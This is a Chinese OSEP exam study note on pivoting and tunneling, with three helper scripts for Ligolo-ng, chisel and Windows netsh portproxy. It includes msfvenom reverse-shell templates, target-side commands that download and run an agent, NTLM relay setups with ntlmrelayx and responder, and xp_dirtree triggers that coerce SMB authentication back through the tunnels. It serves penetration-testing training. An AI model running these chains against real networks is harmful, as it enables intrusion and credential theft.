::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 08 · 隧道与端口转发（Pivoting & Tunneling）

> 场景 34–35。横向移动的核心：**内网可达性 ≠ 你的可达性**，两条方向要分开想。
> 配套脚本：`m08-ligolo-ng-setup.sh`、`m08-chisel-socks.sh`、`m08-port-forward.ps1`。
> 关键词：`Ligolo-ng` `SSHUTTLE` `Autoroute` `Socks`。

---

## 1. 两个场景的一句话结论

| 场景 | 问题 | 结论 |
|---|---|---|
| 34 | 内部网站只接受指定网段访问（Kali 直连被拒，已控 DEV 主机能访问） | 用**本地/动态转发**把"跳板的可达性"搬回 Kali；之后的 payload 一律走"与跳板回连路径一致"的地址 |
| 35 | SOCKS 正向访问内网 SQL/域服务 OK，但目标**主动认证**（回连）到不了你的监听端 | 正向（你发起）与目标主动回连是**两条不同路径**；接收点要放在**目标可达的位置**（跳板/agent 所在机），再转发回 Kali 监听 |

**不要做的事**：正向通了就把 Kali 的 `LHOST` 直接填进目标主动连接的参数里（UNC 路径、payload LHOST、认证回连地址）。目标到 Kali 的路不一定存在，这条错误浪费的时间最多。

---

## 2. 三种转发方向的速查（先想清楚再动手）

| 类型 | 谁 listen | 谁发起 | 典型命令 | 解决什么 |
|---|---|---|---|---|
| 本地转发 `-L` | 本机（Kali） | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali 要访问内网服务（场景 34 主路径） |
| 动态/SOCKS `-D` | 本机（Kali） | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf socks_proxy | 任意工具经代理访问内网（探测/枚举/正向连接） |
| 远程/反连转发 `-R` / listener | 目标侧可达的机器（pivot/agent） | 目标主动连 | ligolo `listener_add`、netsh portproxy、`ssh -R` | 目标主动回连（反向 shell、NTLM 认证回连，场景 35） |
| Ligolo 全子网 | 你的 Kali（tun 接口） | Kali | `ip route add 172.16.X.0/24 dev ligolo` | 整段内网像在本地一样访问 |

**场景 35 的本质**：SOCKS 代理只承载 **Kali 发起的**连接。目标进程（SQL `xp_dirtree`、反向 shell、认证回调）发起连接时走的是**目标自己的路由**，SOCKS 帮不上忙——必须在目标可达的那台机器上开一个接收口，把连接通过隧道送回 Kali 的监听器。

**端口与地址纪律**：所有阶段使用同一份地址/端口规划（见 `docs/00` 端口表，11601=Ligolo 代理、1080=SOCKS、8081=内网站点示例端口）；改动任一参数后立刻用无害连接验证，不要假设。

---

## 3. 场景 34：内部网站只接受来自指定网段的访问

### 场景回顾
Kali 直连内部网站被拒绝（ACL 只放行指定网段），但已控的一台 DEV 网主机能访问该网站；网站（示例 web06:8081）后面还有上传或命令执行入口，最终目的是拿到入口并回连。

### 前提与假设
- 已控制 DEV 主机，且 Kali → DEV 有可用路径（SSH 凭据 / 可执行 payload / Ligolo agent / chisel client）。
- 内部网站 IP 已知（例 `172.16.X.50:8081`），且只允许 DEV 所在网段访问。
- 网站上的上传/命令执行目标（web 主机）**不一定能回连 Kali**，回连目标要按它可达的路径设计（通常 = DEV 主机或 DEV 网段内你开的接收口）。

### 准备（攻击机侧）
```bash
# 预放行：本地端口 8081（转发端口）、1080（SOCKS）、11601（ligolo）
mkdir -p ~/osep/tools ~/osep/logs
# 二进制放 ~/osep/tools：ligolo_proxy_linux / ligolo_agent_windows.exe / chisel / sshuttle（见 scripts/infra/m08-*-setup.sh 依赖说明）
```

### 执行步骤
**Step 0 · 确认跳板出口**（决定用哪条隧道）：
```bash
# DEV 主机上确认它确实能访问内网站点（在已有 shell / 隧道里执行）
curl -s -o /dev/null -w '%{http_code}\n' http://172.16.X.50:8081/
# 确认 DEV 主机到 Kali 的出网能力（这决定回连方向怎么搭）
```

**Step 1 · 建立 Kali → DEV 的转发**（三选一，按手中条件）：

方案 A：DEV 可 SSH（最省事）——本地转发 + 动态代理一起开：
```bash
ssh -N -L 127.0.0.1:8081:172.16.X.50:8081 -D 1080 USER@DEV_IP
# 浏览器/工具访问 http://127.0.0.1:8081（本地转发）；其他内网探测用 127.0.0.1:1080 SOCKS
```

方案 B：Ligolo-ng（DEV 能执行 agent，Windows/Linux 均可）——见 `m08-ligolo-ng-setup.sh`：
```bash
# Kali: proxy + tun + 路由（脚本的 proxy / route 子命令）
sudo ip route add 172.16.X.0/24 dev ligolo
# proxy 控制台: session → start；之后 Kali 直接访问 http://172.16.X.50:8081
```
若内网站点就跑在 DEV 本机（另一常见形态），用 Ligolo 本地转发特殊 IP 即可，无需整段路由：
```bash
sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV 本机回环
curl http://240.0.0.1:8081/
```

方案 C：chisel（DEV 能执行 chisel client）——见 `m08-chisel-socks.sh`。

**Step 2 · 验证内网站点可达 + 找上传/命令执行入口**：
```bash
curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # 期望 200/302
# 后续上传/命令执行交互都走这条已通的路径，不要换回 Kali 直连地址
```

**Step 3 · 网站侧获得执行后，回连 payload 的地址设计**（关键）：web 主机回连目标 = **DEV 主机上你能开的接收口**，经隧道送回 Kali 监听。用 Ligolo 反连 listener 模板：
```
# Kali 终端 1：监听真 shell
rlwrap -cAr nc -lvnp 4444
# Kali 终端 2（ligolo proxy 控制台）：让 agent(DEV) 在 0.0.0.0:PORT 接收、转发回 Kali 127.0.0.1:4444
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4444 --tcp
listener_list
# 生成的 payload LHOST=DEV 主机内网 IP，LPORT=4445（绝不能填 Kali IP）
#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<DEV_IP> LPORT=4445 -f exe -o rev.exe
# 网站侧执行后：web 主机连 DEV:4445 → ligolo 隧道 → Kali 127.0.0.1:4444
```
Windows 形态的 DEV 跳板也能用 `m08-port-forward.ps1` 的 portproxy 做等价转发。

### 用到的脚本
- `m08-ligolo-ng-setup.sh`（proxy/agent/路由/reverse 子命令）
- `m08-chisel-socks.sh`（备选转发 + proxychains）
- `m08-port-forward.ps1`（DEV 是 Windows 时的 netsh portproxy）

### 验证
1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` 返回非拒绝状态码。
2. 在网站入口执行无害回连（如 `nc <DEV_IP> 4445` / 触发一次下载）确认整条链路，再上真 payload。
3. 回连拿到 shell 后立即 `whoami`、`ipconfig /all`——确认拿到的是 **web 主机**而非跳板。

### 失败分支与备选
1. **8081 本地端口被占** → 换 `127.0.0.1:18081`，URL 同步改，别抢 11601/1080。
2. **ssh 方案不通（无凭据/防火墙）** → 切 Ligolo 或 chisel，只要 DEV 能执行 agent 即可，不依赖 SSH 服务。
3. **网站还连不上** → 在 DEV 上先 `curl` 验证网站真可达；可能是 ACL 细化到端口/协议，换 http→https 或换目标端口试试。
4. **回连 payload 到不了 DEV:4445** → 先用无害 TCP 测试（网站侧 `nc` 或命令注入 `ping`）确认 web→DEV 通路；不通就在 DEV 同网段再放一个 agent/listener 作中继。

### 考试注意 OPSEC
- Ligolo 用 `-selfcert`（明文通道）：考试环境可接受，别浪费时间做证书；但**生产/报告不要提加密**。
- 每个转发端口只开一个监听；用 `listener_list` / `ss -tlnp` 确认没有重复占用。
- 先无害验证再上 payload——端口转发链路里少一个验证，错误会叠加（地址错 + 端口错 + 协议错一起排查最费时）。

---

#### `m08-ligolo-ng-setup.sh` {#m08-ligolo-ng-setup-sh}

````bash
#!/usr/bin/env bash
# 用途：Ligolo-ng 全流程助手——proxy 启动、tun/路由、agent 投放、反连转发、文件传输、双层穿透
# 场景：M08 场景 34/35（内网站点 ACL 转发、目标主动回连收口），见 docs/08-pivoting-tunneling.md
# 依赖：ligolo_proxy_linux / ligolo_agent（放 ~/osep/tools）、sudo（ip tuntap/route）、python3（投递 http.server）
# 使用：bash m08-ligolo-ng-setup.sh <subcommand> [参数]
#       proxy            [PORT]              # 创建 tun 接口并启动 proxy(-selfcert)
#       agent            [LHOST] [PORT]      # Kali 起 HTTP 投递 + 打印目标侧下载/运行命令
#       route            NETWORK[/24]        # 整段子网路由（例 172.16.40.0/24）
#       route-local                          # 240.0.0.1/32 → agent 所在机回环（站点跑在 agent 本机时）
#       reverse          AGENT_PORT KALI_PORT# 目标主动回连：打印 listener_add + payload 地址模板
#       file             AGENT_PORT KALI_PORT FILE  # 经隧道把 Kali 上的文件传给目标
#       double           SECOND_TUN NETWORK  # 第二层 tun + 转发 11601（双层穿透）
# 占位符：LHOST=攻击机可达 IP；PORT=proxy 端口(默认11601)；AGENT_PORT=agent 侧接收口；KALI_PORT=Kali 监听口
# 测试状态：已通过 bash -n（本机无 ligolo 二进制/无 tun 权限，未实测）；交互命令需在 proxy 控制台手工执行
set -euo pipefail

TOOLS="${HOME}/osep/tools"
PROXY_BIN="${TOOLS}/ligolo_proxy_linux"
AGENT_BIN="${TOOLS}/ligolo_agent_windows.exe"
TUN="ligolo"
KALI_PORT_DEFAULT=11601

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,17p' "$0" | sed 's/^# //'; exit 1; }

ensure_bin(){ [[ -x "$1" ]] || { warn "缺少 $1 —— 先下载并 chmod +x（放 ~/osep/tools）"; exit 1; }; }

# 创建/拉起 tun 接口
tun_up(){
  local name="$1" user; user="$(id -un)"
  sudo ip tuntap add user "$user" mode tun "$name" 2>/dev/null || true   # 已存在时报错可忽略
  sudo ip link set "$name" up
  ip link show "$name" >/dev/null 2>&1 || { warn "tun 接口 $name 未就绪"; exit 1; }
}

cmd_proxy(){
  local port="${1:-$KALI_PORT_DEFAULT}"
  ensure_bin "$PROXY_BIN"
  tun_up "$TUN"
  say "启动 Ligolo proxy (-selfcert, 明文通道，考试环境够用)，端口 $port"
  say "之后在 proxy 控制台输入:  session → start"
  [[ "$port" != "$KALI_PORT_DEFAULT" ]] && info "agent 连接端口需同步为 $port"
  "$PROXY_BIN" -selfcert -port "$port"
}

cmd_agent(){
  local lhost="${1:-}"; local port="${2:-$KALI_PORT_DEFAULT}"
  [[ -z "$lhost" ]] && { warn "用法: $0 agent LHOST [PORT]"; exit 1; }
  [[ -f "$AGENT_BIN" ]] || { warn "缺少 $AGENT_BIN"; exit 1; }
  (cd "$TOOLS" && python3 -m http.server 80) &   # 投递目录 = ~/osep/tools
  say "HTTP 投递已在 80 端口（日志跟随当前终端）"
  say "目标侧（PowerShell）执行:"
  info "iwr -uri http://${lhost}/ligolo_agent_windows.exe -UseBasicParsing -OutFile ligolo_agent.exe"
  info ".\ligolo_agent.exe -connect ${lhost}:${port} -ignore-cert"
  say "agent 上线后在 proxy 控制台:  session → start"
}

cmd_route(){
  local net="${1:-}"; [[ -z "$net" ]] && { warn "用法: $0 route NETWORK/24"; exit 1; }
  tun_up "$TUN"
  sudo ip route add "$net" dev "$TUN" 2>/dev/null || true
  say "路由已加（重复执行会忽略）：$net dev $TUN"
  info "验证: ip route list | grep $TUN"
  say "再回 proxy 控制台确认 session 已 start，之后 Kali 可直接访问该子网"
}

cmd_route_local(){
  tun_up "$TUN"
  sudo ip route add 240.0.0.1/32 dev "$TUN" 2>/dev/null || true
  say "240.0.0.1/32 → agent 所在机回环（Ligolo 本地端口转发特殊 IP）"
  info "站点跑在 agent 本机时直接: curl http://240.0.0.1:8081/ 或 nmap 240.0.0.1 -sV"
}

cmd_reverse(){
  local agent_port="${1:-}"; local kali_port="${2:-}"
  [[ -z "$agent_port" || -z "$kali_port" ]] && { warn "用法: $0 reverse AGENT_PORT KALI_PORT"; exit 1; }
  say "目标主动回连模板（场景 35 收口用）——先起 Kali 真监听:"
  info "rlwrap -cAr nc -lvnp ${kali_port}"
  say "再在 proxy 控制台执行（agent 在 0.0.0.0:AGENT_PORT 接收，转发回 Kali 127.0.0.1:KALI_PORT）:"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  info "listener_list"
  say "payload/触发参数里的地址 = agent 所在机内网 IP + ${agent_port}（绝不能填 Kali 的公网 IP）:"
  info "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AGENT_IP> LPORT=${agent_port} -f exe -o rev.exe"
}

cmd_file(){
  local agent_port="${1:-}"; local kali_port="${2:-}"; local fname="${3:-}"
  [[ -z "$fname" ]] && { warn "用法: $0 file AGENT_PORT KALI_PORT FILE"; exit 1; }
  say "proxy 控制台执行:"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  say "Kali 侧提供文件（在文件所在目录）:"
  info "python3 -m http.server ${kali_port}"
  say "目标侧下载（URL 里的 IP = agent 所在机内网 IP）:"
  info "Invoke-WebRequest -Uri \"http://<AGENT_IP>:${agent_port}/${fname}\" -OutFile ${fname}"
}

cmd_double(){
  local tun2="${1:-ligolo_double}"; local net2="${2:-}"
  [[ -z "$net2" ]] && { warn "用法: $0 double SECOND_TUN NETWORK/24"; exit 1; }
  say "双层穿透（第二台 agent 经第一跳接入）"
  tun_up "$tun2"
  say "1) proxy 控制台（第一跳会话内）执行:"
  info "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp"
  info "listener_list"
  say "2) 第二台目标（第二层主机）agent 连接地址 = 第一跳 agent 机器 IP:"
  info "ligolo_agent.exe -connect <FIRST_PIVOT_IP>:11601 -ignore-cert"
  say "3) 第二跳会话上线后: session(切到第二跳) → start；Kali 加第二层路由:"
  info "sudo ip route add ${net2} dev ${tun2}"
  info "ip route list | grep ${tun2}"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  proxy)  shift; cmd_proxy "$@";;
  agent)  shift; cmd_agent "$@";;
  route)  shift; cmd_route "$@";;
  route-local) cmd_route_local;;
  reverse) shift; cmd_reverse "$@";;
  file)   shift; cmd_file "$@";;
  double) shift; cmd_double "$@";;
  *) usage;;
esac
````

#### `m08-chisel-socks.sh` {#m08-chisel-socks-sh}

````bash
#!/usr/bin/env bash
# 用途：chisel 隧道备选（Ligolo 不可用时的 SOCKS/单服务转发/反连收口）+ proxychains 配置助手
# 场景：M08 场景 34（内网 Web 经跳板访问）与场景 35（目标主动回连收口），见 docs/08-pivoting-tunneling.md
# 依赖：chisel（Kali 侧 ~/osep/tools/chisel，Linux 版；Windows 版投到目标）、sudo（改 /etc/proxychains4.conf 用）
# 使用：bash m08-chisel-socks.sh <subcommand> [参数]
#       server            [PORT]              # Kali 起 chisel server --reverse（默认 8080）
#       client-socks      SERVER_ADDR         # 打印目标侧命令: 开 R:1080:socks → Kali 127.0.0.1:1080 出口在目标
#       client-forward    SERVER_ADDR LKALI TARGET TPORT  # 打印目标侧命令: Kali 本机 LKALI 口→ 目标 TARGET:TPORT
#       rev-serve         [PORT]              # 场景35: 目标可达的机器上起 chisel server（接收端）
#       rev-client        PIVOT_ADDR PORT KALI_PORT  # 场景35: Kali 侧 client R:PORT:127.0.0.1:KALI_PORT
#       proxychains                             # 往 /etc/proxychains4.conf 加 socks5 行并显示用法
# 占位符：SERVER_ADDR=Kali 的 chisel server 地址(IP:PORT)；PIVOT_ADDR=场景35接收端机器地址
# 测试状态：已通过 bash -n（本机无 chisel，未实测）；chisel R: 的监听端在 server 侧、出口在 client 侧
set -euo pipefail

TOOLS="${HOME}/osep/tools"
CHISEL="${TOOLS}/chisel"

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,15p' "$0" | sed 's/^# //'; exit 1; }

# 拓扑说明（记牢再动手，方向错了等于没隧道）：
#   L:xx 监听在 chisel client；R:xx 监听在 chisel server。
#   R: 的出口在 client 侧 —— 所以 Kali 做 server、目标做 client 时，
#   R:socks / R:PORT:TARGET:PORT 让 Kali 侧多出可用的口，流量从目标侧发出。

cmd_server(){
  local port="${1:-8080}"
  [[ -x "$CHISEL" ]] || { warn "缺少 $CHISEL"; exit 1; }
  say "Kali 侧 chisel server(--reverse)，端口 $port"
  "$CHISEL" server -p "$port" --reverse
}

cmd_client_socks(){
  local addr="${1:-}"; [[ -z "$addr" ]] && { warn "用法: $0 client-socks KALI_SERVER:PORT"; exit 1; }
  say "目标侧执行（目标需能出网连 ${addr}）:"
  info "chisel.exe client ${addr} R:1080:socks"
  say "Kali 侧 proxychains 走 127.0.0.1:1080 访问内网（出口 = 目标机）:"
  info "bash $0 proxychains    # 自动写入 socks5 配置后:"
  info "proxychains4 -q netexec mssql targets.txt -u 'USER' -p 'PASS'"
}

cmd_client_forward(){
  local addr="${1:-}"; local lport="${2:-}"; local target="${3:-}"; local tport="${4:-}"
  [[ -z "$tport" ]] && { warn "用法: $0 client-forward KALI_SERVER:PORT KALI_LPORT TARGET TPORT"; exit 1; }
  say "目标侧执行（Kali 访问 127.0.0.1:${lport} → ${target}:${tport}，场景 34 单服务转发）:"
  info "chisel.exe client ${addr} R:${lport}:${target}:${tport}"
  say "Kali 侧验证:"
  info "curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:${lport}/"
}

cmd_rev_serve(){
  local port="${1:-9310}"
  say "场景 35 接收端：在【目标可达的那台机器】（如内网跳板）起 chisel server:"
  info "./chisel server -p ${port}"
  say "确保这台机器能被目标连到（同网段/防火墙放行 ${port}）"
}

cmd_rev_client(){
  local paddr="${1:-}"; local lport="${2:-}"; local kport="${3:-}"
  [[ -z "$kport" ]] && { warn "用法: $0 rev-client PIVOT_ADDR LISTENPORT KALI_PORT"; exit 1; }
  say "Kali 侧先起认证/回连接收端（root，445 需先停 smbd）:"
  info "sudo ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'     # 监听 ${kport}"
  say "Kali 侧执行（client 连接收端机器，R: 让接收端机器在 ${lport} 监听并转发回 Kali ${kport}）:"
  info "$CHISEL client ${paddr} R:${lport}:127.0.0.1:${kport}"
  say "触发参数里的地址 = 接收端机器内网 IP:${lport}（如 SQL: EXEC master..xp_dirtree '\\\\<PIVOT_IP>\\share'）"
}

cmd_proxychains(){
  local conf="/etc/proxychains4.conf"
  sudo test -w "$conf" || { warn "需要 sudo 写 $conf"; exit 1; }
  if ! grep -qs '^socks[45][[:space:]]*127\.0\.0\.1[[:space:]]*1080' "$conf"; then
    echo "socks5 127.0.0.1 1080" | sudo tee -a "$conf" >/dev/null
    say "已写入: socks5 127.0.0.1 1080（若文件已有旧代理行请先注释掉）"
  else
    say "$conf 已有 127.0.0.1:1080 的 socks 行，跳过"
  fi
  say "用法示例:"
  info "proxychains4 -q netexec smb 172.16.X.0/24 -u USER -p PASS"
  info "proxychains4 -q curl http://172.16.X.50:8081/"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  server)         shift; cmd_server "$@";;
  client-socks)   shift; cmd_client_socks "$@";;
  client-forward) shift; cmd_client_forward "$@";;
  rev-serve)      shift; cmd_rev_serve "$@";;
  rev-client)     shift; cmd_rev_client "$@";;
  proxychains)    cmd_proxychains;;
  *) usage;;
esac
````

#### `m08-port-forward.ps1` {#m08-port-forward-ps1}

````powershell
<#
用途：Windows 跳板上的转发助手——netsh portproxy（正向收口/转发）与 ssh -L/-R 隧道两种形态，含防火墙放行与清理
场景：M08 场景 34（跳板把内网站点/服务转发出去）与场景 35（在跳板上开接收口转回 Kali 的认证监听），见 docs/08-pivoting-tunneling.md
依赖：PowerShell 3+；netsh portproxy 需要管理员权限；ssh 隧道需要目标机上存在 OpenSSH 客户端(ssh.exe)
使用：powershell -ep bypass -f m08-port-forward.ps1 -Mode Add -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081
      powershell -ep bypass -f m08-port-forward.ps1 -Mode Remove -ListenPort 8081
      powershell -ep bypass -f m08-port-forward.ps1 -Mode Show
      powershell -ep bypass -f m08-port-forward.ps1 -Mode SshTunnel -Forward Local -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081 -SshUser root -SshHost 10.10.14.5 -SshKey ~/.ssh/id_rsa
      场景35示例(在跳板收口转 Kali): -Mode Add -ListenAddress <PIVOT_IP> -ListenPort 445 -ConnectAddress <KALI_IP> -ConnectPort 445
占位符：PIVOT_IP=跳板内网 IP；KALI_IP=攻击机可达 IP；TARGET/TARGET_PORT=最终要访问的内网服务
测试状态：未在 Windows 实测（本机为 macOS）；已人工核对 netsh 参数与常见错误分支
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet('Add', 'Remove', 'Show', 'SshTunnel')][string]$Mode,
    [string]$ListenAddress = "0.0.0.0",          # portproxy 监听地址（默认全接口）
    [int]$ListenPort = 0,                        # 跳板上打开的端口（Add/SshTunnel 必填）
    [string]$ConnectAddress = "",                # 转发目标（Add: 内网服务 IP；场景35: Kali IP）
    [int]$ConnectPort = 0,
    [ValidateSet('Local', 'Remote')][string]$Forward = 'Local',  # ssh -L / -R
    [string]$SshHost = "", [string]$SshUser = "", [string]$SshKey = "",
    [switch]$AddFirewallRule,
    [switch]$RemoveFirewallRule
)

function Show-ErrorAndExit($msg) { Write-Error $msg; exit 1 }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

switch ($Mode) {
    'Add' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy 需要管理员权限（提权窗口重跑）" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0) {
            Show-ErrorAndExit "Add 需要 -ListenPort / -ConnectAddress / -ConnectPort"
        }
        # 先清同名，避免重复添加报错
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        netsh interface portproxy add v4tov4 listenport=$ListenPort listenaddress=$ListenAddress `
            connectport=$ConnectPort connectaddress=$ConnectAddress
        if ($LASTEXITCODE -ne 0) { Show-ErrorAndExit "portproxy 添加失败（exit $LASTEXITCODE）" }
        Write-Output "[+] portproxy: $ListenAddress`:$ListenPort -> $ConnectAddress`:$ConnectPort"
        if ($AddFirewallRule) {
            netsh advfirewall firewall add rule name="fp-in-$ListenPort" dir=in action=allow `
                protocol=TCP localport=$ListenPort | Out-Null
            Write-Output "[+] 已放行入站 TCP $ListenPort（规则名 fp-in-$ListenPort）"
        }
        Write-Output "[i] 验证: netsh interface portproxy show all ；回滚: $PSCommandPath -Mode Remove -ListenPort $ListenPort"
    }
    'Remove' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy 需要管理员权限" }
        if ($ListenPort -le 0) { Show-ErrorAndExit "Remove 需要 -ListenPort" }
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        Write-Output "[-] 已删除 portproxy $ListenAddress`:$ListenPort"
        if ($RemoveFirewallRule) {
            netsh advfirewall firewall delete rule name="fp-in-$ListenPort" | Out-Null
            Write-Output "[-] 已删除防火墙规则 fp-in-$ListenPort"
        }
    }
    'Show' {
        netsh interface portproxy show all
        Write-Output "`n[i] 当前 IPv4 转发规则如上；连接数/占用用: netstat -ano | findstr LISTENING"
    }
    'SshTunnel' {
        $ssh = Get-Command ssh.exe -ErrorAction SilentlyContinue
        if (-not $ssh) { Show-ErrorAndExit "未找到 ssh.exe —— 目标无 OpenSSH 客户端时改用 -Mode Add (netsh)" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0 -or -not $SshHost -or -not $SshUser) {
            Show-ErrorAndExit "SshTunnel 需要 -ListenPort / -ConnectAddress / -ConnectPort / -SshHost / -SshUser"
        }
        $sshArgs = @('-N')
        # 本地转发(-L): 本机 ListenPort -> ConnectAddress:ConnectPort（场景34）；远程转发(-R): 远端 listen -> 本机
        # 注意 ssh -R 默认只绑远端回环，需对端 sshd 配置 GatewayPorts 才能被其他主机连到（见 docs/08 场景35备选）
        $spec = if ($Forward -eq 'Local') {
            "127.0.0.1:$ListenPort`:$ConnectAddress`:$ConnectPort"
        } else {
            "0.0.0.0:$ListenPort`:$ConnectAddress`:$ConnectPort"
        }
        $flag = if ($Forward -eq 'Local') { '-L' } else { '-R' }
        $sshArgs += @($flag, $spec)
        if ($SshKey) { $sshArgs += @('-i', $SshKey) }
        $sshArgs += @('-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30')
        $sshArgs += "$($SshUser)@$SshHost"
        Write-Output "[i] 执行: ssh $($sshArgs -join ' ')   （Ctrl+C 断开隧道）"
        & $ssh.Source $sshArgs
    }
}
````

## 4. 场景 35：代理能连接内网目标，但目标主动认证到不了你的监听端

### 场景回顾
你可以经 SOCKS 访问内网 SQL 或域服务（正向 OK），但触发目标**主动连接**（SQL 认证/中继、NTLM 回连）时没有任何认证到达监听端。正向访问与目标回连是两条不同路径（依据：C4 SQL 认证与中继场景）。

### 前提与假设
- 已有 SOCKS/隧道能正向访问内网目标（能跑 `proxychains ... mssql` / 域查询）。
- 目标（SQL Server、域主机）进程能主动外连到**同一网段内某台机器**，但**到不了 Kali**（防火墙/ACL/分段）。
- 你控制一台目标网段内的机器（Ligolo agent / Windows 跳板），或在目标网段内有可执行文件的位置。

### 准备（攻击机侧）
```bash
# Kali：认证接收端 + 中继工具就位（root 运行，SMB 445 需要特权）
sudo systemctl stop smbd   # 先释放 445，否则 responder/ntlmrelayx 起不来
sudo rlwrap responder -I eth0 -A    # 或
sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # 中继版
```
确认 Kali 本地监听端口（445/HTTP）能与隧道 **--to 指向的 127.0.0.1 端口**一致。

### 执行步骤
**Step 0 · 确认"两条路径"**：正向用 proxychains 访问 OK，不等于目标能连 Kali。在目标可达的那台机器（agent/跳板）上起一个临时监听，从目标侧触发一次连接，看是否到达。

**Step 1 · 在目标可达位置开接收口（推荐 Ligolo-ng listener，方向 = 反连转发）**：
```
# Kali 终端 1：认证接收端（真实监听在 Kali 本机）
sudo ntlmrelayx.py -t smb://<内网目标> -smb2support ...    # 监听 0.0.0.0:445
# Kali 终端 2（ligolo proxy 控制台）：agent 在目标侧 0.0.0.0:445 接收 → 转发回 Kali 127.0.0.1:445
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
listener_list
```
**Step 2 · 触发参数里的地址 = agent 所在机器（目标可达的那个 IP），不是 Kali**：
```sql
-- 目标 SQL 上触发对外 SMB 认证（示例：UNC 目录列举）
EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
-- 或 xp_subdirs / xp_fileexist；低权限 SQL 也常能触发（见 [11-mssql](/zh/modules/11-mssql)）
```
认证包：目标 → `<AGENT_INTERNAL_IP>:445` → Ligolo 隧道 → Kali 127.0.0.1:445（ntlmrelayx/responder）。到达即中继或落盘哈希。

**Step 3 · Windows 跳板替代方案（netsh portproxy，跳板能出网到 Kali 时）**：
```powershell
# 在 Windows 跳板（管理员）执行：监听跳板 445 → 转发到 Kali 的 ntlmrelayx
netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
# 触发参数改成 \\<PIVOT_IP>\share；验证：netsh interface portproxy show all
```
前提：跳板→Kali:445 出网放行（agent/beacon 能出网通常意味着行）；目标→跳板:445 放行。

**Step 4 · Linux 跳板备选（ssh -R，需 sshd 允许外部绑定）**：
```bash
# Kali 侧执行；绑在跳板 0.0.0.0:445，转发回 Kali 127.0.0.1:445
ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
# sshd 需 GatewayPorts clientspecified/yes；否则 -R 只绑回环，目标连不到——先确认再依赖
```

### 用到的脚本
- `m08-ligolo-ng-setup.sh`（reverse 子命令，反连转发的标准模板）
- `m08-port-forward.ps1`（Windows 跳板 portproxy，含回滚/清理）
- 触发侧模板见 [11-mssql](/zh/modules/11-mssql) 与 [16-ics-calendar](/zh/modules/16-ics-calendar)（认证触发手段）

### 验证
1. `listener_list` 确认 listener 已加；`ss -tlnp` 确认 Kali 上 445/目标端口真在监听。
2. 触发后 ntlmrelayx/responder 打印认证来源 IP——应为**目标/中继方**，不是 Kali 自身。
3. 中继成功判定：目标主机上执行命令/拿到会话；只捕获哈希时确认 hash 格式与后续破解工具匹配。

### 失败分支与备选
1. **还是没认证到达** → 回到 Step 0：先在目标可达机器上开临时 `nc -lvnp`，从目标侧手动触发一次 TCP 连接，判断是"路径不通"还是"触发参数没生效"——一次只改一个变量。
2. **445 被占/绑定失败** → Kali 先 `sudo systemctl stop smbd`；用非特权端口（如 4455）做 --to 目标并同步改触发侧……（SMB 认证必须 445，若中继到 445 受限，改走 ntlmrelayx HTTP 中继或直接 responder 捕获后用 hash 破解/重放）。
3. **目标只能连本机回环**（SQL 与跳板同机、跳板在目标上）→ 在**目标本机**放 agent/转发器，触发地址用 `127.0.0.1`（ligolo agent 跑在目标上时 --addr 0.0.0.0:445 即本机）。
4. **ligolo 不可用** → chisel / netsh portproxy / ssh -R 三条替代里选符合"目标可达"条件的（跳板形态决定）。

### 考试注意 OPSEC
- 触发**一次**认证就够，别反复触发制造噪声；每次触发前确认监听已就位。
- SMB/HTTP 中继要求目标与中继**同网段且不开 SMB 签名**（可先探测）；EPA/签名等条件见 [12-ad-attacks](/zh/modules/12-ad-attacks) ESC8 与 [16-ics-calendar](/zh/modules/16-ics-calendar)。
- 地址一致性铁律：触发参数里的 IP 永远是"目标可达的那台机"，端口永远是"那条隧道在目标侧开的端口"，两者都要在笔记里写清并复现。

---

## 5. 工具选择速查（本模块覆盖范围之外不展开）

| 需求 | 首选 | 备选 | 注意 |
|---|---|---|---|
